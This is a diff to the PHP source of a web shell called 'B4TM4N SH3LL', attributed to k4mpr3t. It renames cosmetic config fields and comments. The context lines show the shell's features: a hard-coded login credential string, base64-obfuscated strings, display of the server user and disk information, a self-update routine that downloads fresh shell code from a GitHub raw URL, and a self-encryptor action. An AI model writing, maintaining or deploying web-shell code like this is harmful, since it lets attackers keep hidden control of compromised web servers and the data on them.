@@ -29,9 +29,9 @@ $x_="zaIgxSRawZ==:42b378d7eb719b4ad9c908601bdf290d541c9c3a";
  */
 
 $config=array(
-	"name"    => "B4TM4N SH3LL", // Your Name Your Rulez
-	"version" => "2.5",          // Your Version Your Rulez
-	"debug"   => false           // Debug Mode
+	"title"   => "B4TM4N SH3LL",          // Your Title
+	"tagline" => "by k4mpr3t",            // Your Tagline
+	"debug"   => false                    // Debug Mode
 );
 
 $account=explode(':',$x_);
@@ -205,9 +205,9 @@ else
 ini_set('max_execution_time','600');
 ini_set('memory_limit','256M');
 
-$agent=B64D("FT06ACQoAXYrvHYXMUIMMV5e").$config["version"]; 	// Powered by B4TM4N
-$title=sprintf('%s - %s',$config['name'],$config['version']);	// Title Page
-$start=microtime(true);		// Time Pageload
+$agent=B64D("FT06ACQoAXYrvHYXMUIMMV5e"); 	                    // Powered by B4TM4N
+$title=sprintf('%s - %s',$config['title'],$config['tagline']);	// Title Page
+$start=microtime(true);		                                    // Time Pageload
 
 ?><!DOCTYPE html>
 <html>
@@ -1048,7 +1048,7 @@ printf("<div id='header'>
 		B64D($account[0]),remote_addr,remote_port,
 		GetUser("usr"),GetUser("uid"),GetUser("grp"),GetUser("gid"),
 		GetFileSize(@disk_free_space($dir)),GetFileSize(@disk_total_space($dir)),
-		php_sapi_name(),GetSafeMode(),php_self,$config['name'],$config['version'],
+		php_sapi_name(),GetSafeMode(),php_self,$config['title'],$config['tagline'],
 		MainMenu(),MapDrive($map),MapDirectory($map),$map
 );
 
@@ -3020,7 +3020,7 @@ if(any("x",$_REQUEST))
 	if($_REQUEST['x']=="update")
 	{
 		$link_update='https://raw.githubusercontent.com/k4mpr3t/b4tm4n/master/bat.php';
-		$current_version=2.6; //Sensitive Case Variable
+		$current_version=2.6; //New Version Released
 
 		if($config['debug']==true)
 		{
@@ -3056,8 +3056,6 @@ if(any("x",$_REQUEST))
 						<img src='https://www.gnu.org/graphics/lgplv3-88x31.png'/>
 					</a><br><br>%s
 				</div>",$status);
-
-		
 	}
 	if($_REQUEST['x']=="self-encryptor")
 	{
